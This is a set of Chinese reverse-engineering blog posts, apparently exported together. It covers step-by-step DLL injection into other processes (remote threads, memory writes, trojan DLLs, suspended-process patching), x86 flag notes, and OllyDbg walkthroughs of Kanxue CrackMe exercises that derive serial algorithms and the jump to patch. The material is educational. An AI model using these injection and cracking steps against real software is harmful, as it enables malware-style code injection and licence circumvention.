如果拥有了窗口句柄,那么可以调用GetWindowThreadProcessId函数,就可以确定创建窗口的线程ID. 12GetWindowThreadProcessId(HWND hWnd, //被查找的窗口句柄 LPDWORD lpdwProcessId //进程号的存放地址) 强制Windows Explorer线程醒来: 1PostThreadMessage(dwThreadId,WM_NULL,0,0); 查看它是否被初次调用: 1GetMessage(&amp;msg,null,0,0); 使用远程线程来插入DLLDLL的插入方法还有远程线程,Windows大多数函数允许进程只对自己进行操作,它可以防止一个进程破坏另外一个进程.但是有些函数却允许一个进程对另一个进程进行操作.任何函数都可以调用这些函数 这个插入方法基本要求目标中进程的线程调用LoadLibrary函数来加载必要的DLL，除了自己进程中的线程以外，我们无法方法的控制其他进程中的线程，所以我们需要CreateRemoteThread函数在另一个进程中创建线程。 123456789HANDLE CreateRemoteThread{ HANDLE hProcess, //线程所属进程的进程句柄 PSECURITY_ATTRIBUTES psa, //该结构制定了线程的安全属性 DWORD dwSackSize, //线程栈大小，字节为单位，如果该值为0，使用默认大小 PTHREAD_START_ROUTINE pfnStartAddress, //一个LPTHREAD_START_ROUTINE类型的指针，指向在远程进程中执行的函数地址 PVOID pvParam, //传入参数 DWORD fdwCreate, //创建线程的其他标志 PWORD pdwThreadId //线程的身份标志，如果为null，则不返回}; LoadLibrayA和LoadLibraryW的区别： LoadLibrayA传递的是ANSI字符存储的 LoadLibrayW传递的是Unicode字符串存储的 代码区别： 1234LoadLibraryAHANDLE hThread = CreateRemoteThread(hProcessRomote,NULL,0,LoadLibraryA ,&quot;C:\\\\MyLib.dll&quot;,0,null)LoadLibraryWHANDLE hThread = CreateRemoteThread(hProcessRomote,NULL,0,LoadLibraryW ,&quot;C:\\\\MyLib.dll&quot;,0,null) 我们放置该字符串的地址传递给CreateRemoteTHread函数，必须使用VirtualAllocEx，使得一个进程能够分配另一个进程的地址空间中的内存 12345678910111213141516分配：PVOID VirtualAllocEx( HANDLE hProcess, PVOID pvAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);释放：BOOL VirtualFreeEx( HANDLE hProcess, PVOID pvAddress, SIZE_T dwSize, DWORD dwFreeType); 一旦为该字符串分配了内存，我们还需要一种方法将该字符串从我们的进程的地址空间拷贝到远程的地址空间中，Windows提供了两个函数给我们这么做： 123456789101112131415BOOL ReadProcessMemory(HANDLE hProcess, //远程地址 PVOID pvAddressRemote, //远程进程中的地址 PVOID pvBufferLocal, //本地进程中的内存地址 DOWRD dwSize, //传送的字节数 PDWORD pdwNumBytesRead //实际传送的字节数 );BOOL WriteProcessMemory( HANDLE hProcess, PVOID pvAddressRemote, PVOID pvBufferLocal, DOWRD dwSize, PDWORD pdwNumBytesWritten); 使用VirtualAllocEx函数，分配远程进程的地址空间中的内存 使用WriteProcessMemory函数，将DLL的路径名拷贝到第一个步骤中已经分配的内存中 使用GetProcAddress函数，获取LoadLibraryA或者LoadLibraryW函数的实地址 使用CreateRemoteThread函数，在远程进程中创建一个线程，它调用正确的LoadLibrary函数，为它传递第一个步骤中分配的内存的地址 使用VirtualFreeEx函数，释放第一个步骤中分配的内存 使用GetProcAddress函数，获得FreeLibrary函数的实地址 使用CreateRemoteThread函数，在远程进程中创建一个线程，它调用FreeLibrary函数，传递远程DLL的HINSTANCE 使用特洛伊DLL来插入DLL插入DLL的另一种方法是取代你已经知道进程将要加载的DLL。直接覆盖掉它原来的位置同名的DLL 如果只是在单个程序中使用这个办法，那么可以为自己的DLL创建一个独一无二的名字，并改变应用程序中的输入节，更重要的是，输入节只包含模块需要的DLL名字，你可以仔细搜索文件中的这个节，并且改变它，使用加载程序加载自己的DLL 将DLL作为调试程序插入调试程序能够对被调试的进程执行特殊的操作，当被调试进程加载时，在北条氏进程的地址空间已经准备号，但是被调试进程的主线程尚未执行代码之前，系统将自动通知调试程序，这时候，调试程序可以强制将某些代码插入被调试进程的地址空间中，然后使北条氏进程的主线程执行该代码 Windows 98上的内存映射文件插入代码CreateProcess插入代码如果你的进程生成了你想插入代码的新进程，你的进程(父进程)能够创建暂停运行的新进程，这就使得你可以修改子进程的状态，而不映像运行，因为它未运行，但是父进程也能得到子进程的主线程句柄，使用该句柄，可以修改线程执行的代码； 下面介绍一种方法，可以使你的进程能够控制紫禁城的主线程执行什么代码 使你的进程生成暂停运行的子线程 从exe模块的头文件中检索主线程的起始内存地址 将机器指令保存在该内存地址中 将某些硬编码的机器指令强制放入该地址中，这些指令回调用LoadLibrary 继续运行子进程的主线程，使得代码得以执行 将原始执行重新放入起始地址 让进程继续从开始地址开始执行","link":"/2019/10/12/%E6%8F%92%E5%85%A5DLL%E5%92%8C%E6%8C%82%E9%92%A9%E5%AD%90/"},{"title":"汇编语言 - jcc","text":"在8086cpu中标志寄存器都是16位的，而其中存储的信息被称为程序状态字（一段包含系统状态的内存或者是硬件区域） CFCarry flag位，若算术操作产生的结果在做高有效位发生进位或借位则将其置为1，反之清零。 这个标志通常用来指示无符号数运算的溢出状态。 PFParity flag位，如果结果的最低位有效字节包含偶数个1位则该位置为1，否则为0 AF辅助进位标志，如果算术操作在结果的第3位发生了进位或借位将该标志置为1，否则为0 ZFZero flag位，若结果为0则将其置为1，反之为0 通常用cmp或test等指令一起使用； 123mov eax,100mov ecx,100cmp eax,ecx SF既然是符号标志位，就是对有符号数据来说的。如果结果为负，就置1；结果为正，就置0。 TF定时器溢出标志。这个位主要是用来在debug中进行-t指令时使用的。当cpu在执行完一条指令后，如果检测到TF位的值为1，则产生单步中断，引发中断过程。通过这个位，我们就可以在debug中对程序进行单步跟踪。 IF中断允许标志位。当IF=1时，cpu在执行完当前指令后响应中断，引发中断过程；当IF=0时，则不响应可屏蔽中断。 DF方向标志位。在串处理指令中，控制每次操作后，si（指向原始偏移地址）、di（指向目标偏移地址）的增减。当DF=0时，每次操作后，si、di递增；DF=1时，每次操作后，si、di递减。我们可以使用cld指令将DF的值置为0，使用std指令将DF的值置为1。DF需要与rep、movsb等指令配合使用。 OF溢出标志位。这个位是用来判断有没有溢出的。注意溢出这个概念只对于有符号数据而言，就如同进位只对于无符号数据而言。当OF=0时，说明没有溢出；当OF=1时，说明溢出了。 cmpCMP指令： 123456789指令格式：CMP R/M,R/M/IMM 该指令是比较两个操作数,实际上,它相当于SUB指令,但是相减的结构并不保存到第一个操作数中。 只是根据相减的结果来改变零标志位的,当两个操作数相等的时候,零标志位置1。 MOV EAX,100 MOV ECX,100 CMP EAX,ECX 观察Z位 ​ 123MOV EAX,100 MOV ECX,200 CMP EAX,ECX 观察S位 ​ 12345CMP AX,WORD PTR DS:[405000] CMP AL,BYTE PTR DS:[405000] CMP EAX,DWORD PTR DS:[405000] testTEST指令： 12345678910111213141516171819指令格式：TEST R/M,R/M/IMM 该指令在一定程序上和CMP指令时类似的,两个数值进行与操作,结果不保存,但是会改变相应标志位. 与的操作表项如下： 1 and 1 = 1 1 and 0 = 0 0 and 1 = 0 0 and 0 = 0 常见用法：用这个指令,可以确定某寄存器是否等于0。 TEST EAX,EAX 观察Z位 但是如果EAX的二进制某些位为1的话,那么运算的结果就不为零。 跳转指令11、 JE, JZ 结果为零则跳转(相等时跳转) ZF=1 ​ 12、 JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 ​ 13、 JS 结果为负则跳转 SF=1 ​ 14、 JNS 结果为非负则跳转 SF=0 ​ 15、 JP, JPE 结果中1的个数为偶数则跳转 PF=1 ​ 16、 JNP, JPO 结果中1的个数为偶数则跳转 PF=0 ​ 17、 JO 结果溢出了则跳转 OF=1 ​ 18、 JNO 结果没有溢出则跳转 OF=0 ​ 19、 JB, JNAE 小于则跳转 (无符号数) CF=1 ​ 110、 JNB, JAE 大于等于则跳转 (无符号数) CF=0 ​ 111、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 ​ 112、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 ​ 113、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF ​ 114、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF ​ 115、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF ​ 116、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF","link":"/2020/04/28/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-jcc/"},{"title":"看雪CrackMe001","text":"一步步尝试将《加密与解密》第五章得课后作业得CrackMe全部破解，通过任何手段写出一个类似注册机得东西。 环境 WinXP Sp3 + 52Pojie六周年OllyDbg + PEID(0.95) 软件下载地址：https://github.com/sYstemk1t/Code-collection/tree/master/CrackMe/看雪/看雪CrackMe001 分析过程题目提示，非明码比较，无错误提示得CrackMe，我们打开软件随意输入我们得伪码，发现并没有错误提示。 检测一下是否加壳了，这个软件比较坑得一点就是，放入PEiD中，提示是Microsoft Visual C++ 8，我一开始认为它没有壳，后来发现自己错了，点击深度扫描，提示Aspack v2.12，然后我们脱壳，脱壳过程就不赘述了，因为我不会手动，都是靠软件，傻瓜化操作。 复习一下我们在《加密与解密》这本书里学到得一个知识点，获取用户输入到输入框得API一般有两个： GetDlgItemTextA GetWindowTextA 我们将程序拽入OD中，然后让程序运行起来，然后分别bp这两个API函数。 然后查看它调用得堆栈部分，然后发现我们得断点部分停下来了，有一个call函数，我们在堆栈中查看； 然后我们跟随这个地址，来到0040153E处，向上翻； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321400401528 |. 68 00010000 push 0x100 ; /Count = 100 (256.)0040152D |. 8D85 00FFFFFF lea eax,[local.64] ; |00401533 |. 50 push eax ; |Buffer = 0000000100401534 |. 6A 65 push 0x65 ; |ControlID = 65 (101.)00401536 |. FF75 08 push [arg.1] ; |hWnd = 002501FA ('TheBigMan's CrackMe #6',class='#32770')00401539 |. E8 FA010000 call &lt;jmp.&amp;USER32.GetDlgItemTextA&gt; ; \\GetDlgItemTextA0040153E |. 89C3 mov ebx,eax ; ebx=09h00401540 |. 09DB or ebx,ebx ; 检测用户是否输入00401542 |. 75 04 jnz short unpacked.0040154800401544 |. 31C0 xor eax,eax00401546 |. EB 50 jmp short unpacked.0040159800401548 |&gt; BF BC020000 mov edi,0x2BC ; 2BC0040154D |. BE 30000000 mov esi,0x30 ; 3000401552 |. B8 48000000 mov eax,0x48 ; 4800401557 |. 99 cdq00401558 |. F7FB idiv ebx0040155A |. 29C6 sub esi,eax0040155C |. 8D34B6 lea esi,dword ptr ds:[esi+esi*4]0040155F |. 29F7 sub edi,esi ; unpacked.0040255E00401561 |. 6BFF 6B imul edi,edi,0x6B ; EDI的结果乘以0x6B00401564 |. 81EF 6CCF0000 sub edi,0xCF6C ; EDI的结果加上0xCF6C0040156A |. 81FF 00230000 cmp edi,0x2300 ; EDI=(2bc-(30-48/namelen)*5)*6b-cf6c00401570 |. 7F 08 jg short unpacked.0040157A ; 判断是否大于230000401572 |. 81FF 90010000 cmp edi,0x190 ; 二次判断，结果不能小于19000401578 |. 7D 04 jge short unpacked.0040157E0040157A |&gt; 31C0 xor eax,eax0040157C |. EB 1A jmp short unpacked.004015980040157E |&gt; 8D85 00FFFFFF lea eax,[local.64]00401584 |. 50 push eax ; 取用户名的地址00401585 |. 53 push ebx ; 用户名的长度00401586 |. FF75 08 push [arg.1]00401589 |. E8 77FDFFFF call unpacked.004013050040130500401305 /$ 55 push ebp00401306 |. 89E5 mov ebp,esp00401308 |. 81EC 2C040000 sub esp,0x42C ; 栈0040130E |. 53 push ebx0040130F |. 56 push esi ; unpacked.0040255E00401310 |. 57 push edi00401311 |. 8DBD FCFEFFFF lea edi,[local.65]00401317 |. 8D35 38204000 lea esi,dword ptr ds:[0x402038]0040131D |. B9 40000000 mov ecx,0x4000401322 |. F3:A5 rep movs dword ptr es:[edi],dword ptr ds&gt;00401324 |. 8DBD E1FBFFFF lea edi,dword ptr ss:[ebp-0x41F]0040132A |. 8D35 38214000 lea esi,dword ptr ds:[0x402138]00401330 |. B9 40000000 mov ecx,0x4000401335 |. F3:A5 rep movs dword ptr es:[edi],dword ptr ds&gt;00401337 |. 8DBD E1FDFFFF lea edi,dword ptr ss:[ebp-0x21F]0040133D |. 8D35 38224000 lea esi,dword ptr ds:[0x402238]00401343 |. B9 40000000 mov ecx,0x4000401348 |. F3:A5 rep movs dword ptr es:[edi],dword ptr ds&gt;0040134A |. 8DBD E1FCFFFF lea edi,dword ptr ss:[ebp-0x31F]00401350 |. 8D35 38234000 lea esi,dword ptr ds:[0x402338]00401356 |. B9 40000000 mov ecx,0x400040135B |. F3:A5 rep movs dword ptr es:[edi],dword ptr ds&gt;0040135D |. 8DBD DCFBFFFF lea edi,[local.265]00401363 |. 8D35 38244000 lea esi,dword ptr ds:[0x402438]00401369 |. B9 05000000 mov ecx,0x50040136E |. F3:A4 rep movs byte ptr es:[edi],byte ptr ds:[&gt;00401370 |. 8DBD D6FBFFFF lea edi,dword ptr ss:[ebp-0x42A]00401376 |. 8D35 3D244000 lea esi,dword ptr ds:[0x40243D]0040137C |. B9 03000000 mov ecx,0x300401381 |. F3:66:A5 rep movs word ptr es:[edi],word ptr ds:[&gt;00401384 |. 8DBD E1FEFFFF lea edi,dword ptr ss:[ebp-0x11F]0040138A |. 8D35 43244000 lea esi,dword ptr ds:[0x402443]00401390 |. B9 1B000000 mov ecx,0x1B00401395 |. F3:A4 rep movs byte ptr es:[edi],byte ptr ds:[&gt;00401397 |. C745 FC 00000&gt;mov [local.1],0x00040139E |. 68 00010000 push 0x100 ; /Count = 100 (256.)004013A3 |. 8D85 E1FCFFFF lea eax,dword ptr ss:[ebp-0x31F] ; |004013A9 |. 50 push eax ; |Buffer = 00000001004013AA |. 6A 66 push 0x66 ; |ControlID = 66 (102.)004013AC |. FF75 08 push [arg.1] ; |hWnd = 002501FA ('TheBigMan's CrackMe #6',class='#32770')004013AF |. E8 84030000 call &lt;jmp.&amp;USER32.GetDlgItemTextA&gt; ; \\GetDlgItemTextA004013B4 |. 09C0 or eax,eax ; 判断是否输入004013B6 |. 0F84 48010000 je unpacked.00401504004013BC |. B8 CF110000 mov eax,0x11CF ; EAX=011CF004013C1 |. 0FB68D E1FCFF&gt;movzx ecx,byte ptr ss:[ebp-0x31F]004013C8 |. 99 cdq004013C9 |. F7F9 idiv ecx ; 带符号除法，因为我输入的第一个字母是s，ANSI码为31004013CB |. 83FA 17 cmp edx,0x17 ; 0x11CF除以&quot;s&quot;的ANSI码，查看结构是否等于17004013CE |. 74 07 je short unpacked.004013D7004013D0 |. 31C0 xor eax,eax004013D2 |. E9 2D010000 jmp unpacked.00401504004013D7 |&gt; 31DB xor ebx,ebx004013D9 |. EB 0B jmp short unpacked.004013E6004013DB |&gt; 8B45 10 /mov eax,[arg.3] ; unpacked.004015A1004013DE |. 0FBE0418 |movsx eax,byte ptr ds:[eax+ebx]004013E2 |. 0145 FC |add [local.1],eax004013E5 |. 43 |inc ebx004013E6 |&gt; 3B5D 0C cmp ebx,[arg.2]004013E9 |.^ 7C F0 \\jl short unpacked.004013DB004013EB |. 31DB xor ebx,ebx004013ED |. E9 83000000 jmp unpacked.00401475 ; for(=0;i&lt;namelen;++i)004013F2 |&gt; 8B55 10 /mov edx,[arg.3] ; unpacked.004015A1004013F5 |. 0FBE3C1A |movsx edi,byte ptr ds:[edx+ebx]004013F9 |. 8B75 FC |mov esi,[local.1] ; local.1为name个字母ASCII码的值004013FC |. 89D9 |mov ecx,ebx004013FE |. C1E1 02 |shl ecx,0x200401401 |. 89DA |mov edx,ebx00401403 |. 42 |inc edx00401404 |. 29D1 |sub ecx,edx ; n = i*4 - (i+1)00401406 |. 0FB68C0D E1FE&gt;|movzx ecx,byte ptr ss:[ebp+ecx-0x11F] ; 26个字母的第n位0040140E |. 89FA |mov edx,edi00401410 |. 31CA |xor edx,ecx ; name[i]与字母异或00401412 |. 89F1 |mov ecx,esi ; unpacked.0040255E00401414 |. 0FAFCB |imul ecx,ebx00401417 |. 29F1 |sub ecx,esi ; unpacked.0040255E00401419 |. 89CE |mov esi,ecx0040141B |. 83F6 FF |xor esi,-0x1 ; (sum*i - sum)异或0xFFFFFFFF0040141E |. 8DB432 4D0100&gt;|lea esi,dword ptr ds:[edx+esi+0x14D] ; ESI = EDX + ESI + 0x14D00401425 |. 8B4D 0C |mov ecx,[arg.2]00401428 |. 89DA |mov edx,ebx0040142A |. 83C2 03 |add edx,0x3 ; i+30040142D |. 0FAFCA |imul ecx,edx ; name[i]*name_length*(i+3)00401430 |. 0FAFCF |imul ecx,edi00401433 |. 89F0 |mov eax,esi ; unpacked.0040255E00401435 |. 01C8 |add eax,ecx00401437 |. B9 0A000000 |mov ecx,0xA0040143C |. 31D2 |xor edx,edx0040143E |. F7F1 |div ecx00401440 |. 83C2 30 |add edx,0x30 ; s1=((esi+name[i]*name_length)+(i+3)%0xa)+0x3000401443 |. 88941D FCFEFF&gt;|mov byte ptr ss:[ebp+ebx-0x104],dl0040144A |. 0FB6BC1D FCFE&gt;|movzx edi,byte ptr ss:[ebp+ebx-0x104]00401452 |. 81F7 ACAD0000 |xor edi,0xADAC ; s1异或0xadac00401458 |. 89DE |mov esi,ebx0040145A |. 83C6 02 |add esi,0x2 ; i+20040145D |. 89F8 |mov eax,edi0040145F |. 0FAFC6 |imul eax,esi ; (s1异或0xadac)*(1+2)00401462 |. B9 0A000000 |mov ecx,0xA00401467 |. 99 |cdq00401468 |. F7F9 |idiv ecx0040146A |. 83C2 30 |add edx,0x30 ; (((s1异或0xadac)*(i+2))%0xa)+0x300040146D |. 88941D FCFEFF&gt;|mov byte ptr ss:[ebp+ebx-0x104],dl00401474 |. 43 |inc ebx00401475 |&gt; 3B5D 0C cmp ebx,[arg.2]00401478 |.^ 0F8C 74FFFFFF \\jl unpacked.004013F20040147E |. 8D85 FCFEFFFF lea eax,[local.65]00401484 |. 50 push eax ; 取出上个函数的结果00401485 |. 6A 54 push 0x5400401487 |. 8D85 DCFBFFFF lea eax,[local.265]0040148D |. 50 push eax ; |Format = 00000001 ???0040148E |. 8D85 E1FBFFFF lea eax,dword ptr ss:[ebp-0x41F] ; |00401494 |. 50 push eax ; |s = 0000000100401495 |. E8 CE020000 call &lt;jmp.&amp;USER32.wsprintfA&gt; ; \\wsprintfA0040149A |. 8B7D 0C mov edi,[arg.2]0040149D |. 89F8 mov eax,edi0040149F |. 0FAF45 FC imul eax,[local.1] ; name_length * sum004014A3 |. B9 64000000 mov ecx,0x64004014A8 |. 99 cdq004014A9 |. F7F9 idiv ecx004014AB |. 89D7 mov edi,edx004014AD |. 83C7 30 add edi,0x30 ; ((name_length*sum)%sum 0x64) + 0x30004014B0 |. 57 push edi004014B1 |. 8DBD E1FBFFFF lea edi,dword ptr ss:[ebp-0x41F]004014B7 |. 57 push edi004014B8 |. 8DBD D6FBFFFF lea edi,dword ptr ss:[ebp-0x42A]004014BE |. 57 push edi ; |Format = &quot;h?&quot;004014BF |. 8DBD E1FDFFFF lea edi,dword ptr ss:[ebp-0x21F] ; |004014C5 |. 57 push edi ; |s = 0012FA14004014C6 |. E8 9D020000 call &lt;jmp.&amp;USER32.wsprintfA&gt; ; \\wsprintfA004014CB |. 83C4 20 add esp,0x20004014CE |. 8D8D E1FDFFFF lea ecx,dword ptr ss:[ebp-0x21F]004014D4 |. 83C8 FF or eax,-0x1004014D7 |&gt; 40 /inc eax004014D8 |. 803C01 00 |cmp byte ptr ds:[ecx+eax],0x0004014DC |.^ 75 F9 \\jnz short unpacked.004014D7004014DE |. 50 push eax004014DF |. 8D85 E1FCFFFF lea eax,dword ptr ss:[ebp-0x31F]004014E5 |. 50 push eax004014E6 |. 8D85 E1FDFFFF lea eax,dword ptr ss:[ebp-0x21F]004014EC |. 50 push eax004014ED |. E8 D0FDFFFF call unpacked.004012C2004012C2 /$ 55 push ebp004012C3 |. 89E5 mov ebp,esp004012C5 |. 53 push ebx004012C6 |. 56 push esi ; unpacked.0040255E004012C7 |. 57 push edi004012C8 |. 8B5D 10 mov ebx,[arg.3] ; s2_length004012CB |. 31F6 xor esi,esi ; unpacked.0040255E004012CD |. 46 inc esi ; j-1004012CE |. EB 29 jmp short unpacked.004012F9004012D0 |&gt; 8B55 08 /mov edx,[arg.1]004012D3 |. 0FBE3C32 |movsx edi,byte ptr ds:[edx+esi]004012D7 |. 89F8 |mov eax,edi004012D9 |. 83F0 20 |xor eax,0x20004012DC |. B9 0A000000 |mov ecx,0xA004012E1 |. 99 |cdq004012E2 |. F7F9 |idiv ecx004012E4 |. 89D7 |mov edi,edx004012E6 |. 83C7 30 |add edi,0x30004012E9 |. 8B55 0C |mov edx,[arg.2]004012EC |. 0FBE1432 |movsx edx,byte ptr ds:[edx+esi]004012F0 |. 39D7 |cmp edi,edx004012F2 |. 74 04 |je short unpacked.004012F8004012F4 |. 31C0 |xor eax,eax004012F6 |. EB 08 |jmp short unpacked.00401300004012F8 |&gt; 46 |inc esi ; unpacked.0040255E004012F9 |&gt; 39DE cmp esi,ebx004012FB |.^ 7C D3 \\jl short unpacked.004012D0004012FD |. 31C0 xor eax,eax004012FF |. 40 inc eax00401300 |&gt; 5F pop edi ; 0012FA3B00401301 |. 5E pop esi ; 0012FA3B00401302 |. 5B pop ebx ; 0012FA3B00401303 |. 5D pop ebp ; 0012FA3B00401304 \\. C3 retn 注册机","link":"/2019/12/31/%E7%9C%8B%E9%9B%AACrackMe001/"},{"title":"看雪CrackMe002","text":"一步步尝试将《加密与解密》第五章得课后作业得CrackMe全部破解，通过任何手段写出一个类似注册机得东西。 环境 WinXP Sp3 + 52Pojie六周年OllyDbg + PEID(0.95) 软件下载地址：https://github.com/sYstemk1t/Code-collection/tree/master/CrackMe/看雪/看雪CrackMe002 分析过程这个程序和《看雪CrackMe001》是一样的，都是输入错误无提示框，我们经历了第一次的坑，我们老老实实的去PEiD查壳，提示是Delphi的程序，无壳，也省事了，直接放入OD中，让程序跑起来。 Delphi的程序用OD自带的字符串查找工具，在这个程序中只能找到下图的字符串； 中间比较有意思的是，i am Bin Laden，我是本拉登，其实在这里进入函数也可以，我是看过师傅们写的Writeup的，所以这个地址应该差不多，师傅们的办法是直接使用插件来搜索字符串。 我们直接进入恭喜这里，查看这里的反汇编代码： 因为我也不熟悉Delphi编写的程序，所以在和师傅学破解VB程序的时候，直接找到函数的顶部，然后从上向下分析，不会丢掉重要信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361370048C6D4 /. 55 push ebp0048C6D5 |. 8BEC mov ebp,esp0048C6D7 |. 83C4 84 add esp,-0x7C ; 局部变量空间0048C6DA |. 53 push ebx0048C6DB |. 56 push esi0048C6DC |. 57 push edi0048C6DD |. 33C9 xor ecx,ecx0048C6DF |. 894D 84 mov [local.31],ecx0048C6E2 |. 894D FC mov [local.1],ecx0048C6E5 |. 894D F8 mov [local.2],ecx0048C6E8 |. 894D F4 mov [local.3],ecx0048C6EB |. 894D F0 mov [local.4],ecx0048C6EE |. 894D EC mov [local.5],ecx0048C6F1 |. 8BD8 mov ebx,eax0048C6F3 |. 33C0 xor eax,eax0048C6F5 |. 55 push ebp0048C6F6 |. 68 67C84800 push 壹只老虎.0048C8670048C6FB |. 64:FF30 push dword ptr fs:[eax]0048C6FE |. 64:8920 mov dword ptr fs:[eax],esp0048C701 |. 8D55 FC lea edx,[local.1] ; local1存放注册名0048C704 |. 8B83 04030000 mov eax,dword ptr ds:[ebx+0x304]0048C70A |. E8 E57EFAFF call 壹只老虎.004345F4 ; 读取注册码位数0048C70F |. 8D55 F8 lea edx,[local.2]0048C712 |. 8B83 08030000 mov eax,dword ptr ds:[ebx+0x308]0048C718 |. E8 D77EFAFF call 壹只老虎.004345F4 ; 读取注册码位数0048C71D |. 8D45 F4 lea eax,[local.3]0048C720 |. BA 80C84800 mov edx,壹只老虎.0048C880 ; i am Bin Laden0048C725 |. E8 CA77F7FF call 壹只老虎.00403EF40048C72A |. 8D45 F0 lea eax,[local.4]0048C72D |. BA 98C84800 mov edx,壹只老虎.0048C898 ; i am yi zhi lao hu0048C732 |. E8 BD77F7FF call 壹只老虎.00403EF40048C737 |. 8B45 FC mov eax,[local.1]0048C73A |. E8 DD79F7FF call 壹只老虎.0040411C0048C73F |. 83F8 0A cmp eax,0xA ; 获取输入判断是否大于100048C742 |. 0F8C FC000000 jl 壹只老虎.0048C844 ; 用户名输入不到10,失败0048C748 |. 8B45 FC mov eax,[local.1] ; 将我们输入的用户名传递进入eax寄存器中0048C74B |. E8 CC79F7FF call 壹只老虎.0040411C0048C750 |. 83F8 10 cmp eax,0x10 ; 用户名长度是否大于160048C753 |. 0F8F EB000000 jg 壹只老虎.0048C844 ; 大于16个字符,失败0048C759 |. 8B45 F8 mov eax,[local.2] ; 将注册码放入EAX中0048C75C |. E8 BB79F7FF call 壹只老虎.0040411C0048C761 |. 83F8 11 cmp eax,0x11 ; 判断注册码长度是否大于170048C764 |. 0F8C DA000000 jl 壹只老虎.0048C844 ; 小于17个字符则失败0048C76A |. 8B45 F8 mov eax,[local.2]0048C76D |. E8 AA79F7FF call 壹只老虎.0040411C0048C772 |. 83F8 16 cmp eax,0x16 ; 判断注册码不能大于240048C775 |. 0F8F C9000000 jg 壹只老虎.0048C844 ; 以上代码都对注册码和用户名的长度判断0048C77B |. 8D45 FC lea eax,[local.1] ; 将注册名指针放入EAX中0048C77E |. 8B55 F4 mov edx,[local.3] ; 将程序的i am Bin laden放入EDX中0048C781 |. E8 9E79F7FF call 壹只老虎.004041240048C786 |. BB 64000000 mov ebx,0x64 ; 0x64放入EBX中0048C78B |. 8D45 88 lea eax,[local.30]0048C78E |&gt; C600 2E /mov byte ptr ds:[eax],0x2E ; 这个循环初始化内存区域,从0012FD44开始的0x64大小0048C791 |. 40 |inc eax0048C792 |. 4B |dec ebx0048C793 |.^ 75 F9 \\jnz short 壹只老虎.0048C78E0048C795 |. 8B45 FC mov eax,[local.1] ; local1变成了注册名和软件的合集0048C798 |. E8 7F79F7FF call 壹只老虎.0040411C ; 返回长度0048C79D |. 8BF8 mov edi,eax0048C79F |. 85FF test edi,edi0048C7A1 |. 7E 47 jle short 壹只老虎.0048C7EA0048C7A3 |. BB 01000000 mov ebx,0x1 ; 循环计数器0048C7A8 |&gt; 8B45 F0 /mov eax,[local.4] ; 这里是程序的一只老虎0048C7AB |. E8 6C79F7FF |call 壹只老虎.0040411C ; 返回长度0048C7B0 |. 8BF0 |mov esi,eax0048C7B2 |. 85F6 |test esi,esi0048C7B4 |. 7E 30 |jle short 壹只老虎.0048C7E60048C7B6 |. B9 01000000 |mov ecx,0x1 ; 循环计数器0048C7BB |&gt; 8B45 FC |/mov eax,[local.1]0048C7BE |. 0FB64418 FF ||movzx eax,byte ptr ds:[eax+ebx-0x1] ; 将用户名的ASCII码一次放入eax中0048C7C3 |. 8B55 F8 ||mov edx,[local.2] ; 将输入的注册码放入EDX中0048C7C6 |. 0FB6540A FF ||movzx edx,byte ptr ds:[edx+ecx-0x1] ; 读取输入的注册码的每一位0048C7CB |. F7EA ||imul edx ; 相乘0048C7CD |. 51 ||push ecx0048C7CE |. B9 1A000000 ||mov ecx,0x1A ; ECX=0x1A0048C7D3 |. 33D2 ||xor edx,edx0048C7D5 |. F7F1 ||div ecx0048C7D7 |. 59 ||pop ecx ; 0012FDDC0048C7D8 |. 83C2 41 ||add edx,0x41 ; EDX+0x410048C7DB |. 8D0419 ||lea eax,dword ptr ds:[ecx+ebx] ; ECX+EBX0048C7DE |. 885405 87 ||mov byte ptr ss:[ebp+eax-0x79],dl ; 将前面计算好的余数和41放入初始化好的那一块内存中的第ECX+EBX个位置中,转换为大写0048C7E2 |. 41 ||inc ecx0048C7E3 |. 4E ||dec esi0048C7E4 |.^ 75 D5 |\\jnz short 壹只老虎.0048C7BB0048C7E6 |&gt; 43 |inc ebx0048C7E7 |. 4F |dec edi0048C7E8 |.^ 75 BE \\jnz short 壹只老虎.0048C7A80048C7EA |&gt; 8D45 EC lea eax,[local.5]0048C7ED |. E8 6A76F7FF call 壹只老虎.00403E5C0048C7F2 |. 8B45 F8 mov eax,[local.2]0048C7F5 |. E8 2279F7FF call 壹只老虎.0040411C ; 返回注册码的位数0048C7FA |. 8BF8 mov edi,eax0048C7FC |. 85FF test edi,edi0048C7FE |. 7E 1F jle short 壹只老虎.0048C81F0048C800 |. 8D5D 8E lea ebx,dword ptr ss:[ebp-0x72]0048C803 |&gt; 8D45 84 /lea eax,[local.31]0048C806 |. 8A13 |mov dl,byte ptr ds:[ebx]0048C808 |. E8 3778F7FF |call 壹只老虎.00404044 ; 将字符写入00995A680048C80D |. 8B55 84 |mov edx,[local.31]0048C810 |. 8D45 EC |lea eax,[local.5]0048C813 |. 8B4D EC |mov ecx,[local.5]0048C816 |. E8 4D79F7FF |call 壹只老虎.00404168 ; 将字符反向放置0048C81B |. 43 |inc ebx0048C81C |. 4F |dec edi0048C81D |.^ 75 E4 \\jnz short 壹只老虎.0048C803 ; 计算好的那一串的第六位开始取注册码的位数,然后倒置,和注册码比较0048C81F |&gt; 8B45 EC mov eax,[local.5]0048C822 |. 8B55 F8 mov edx,[local.2]0048C825 |. E8 3E7AF7FF call 壹只老虎.00404268 ; 比较函数0048C82A 75 18 jnz short 壹只老虎.0048C844 ; 关键跳转,修改这个跳转,可以实现爆破0048C82C |. 6A 40 push 0x400048C82E |. B9 ACC84800 mov ecx,壹只老虎.0048C8AC ; 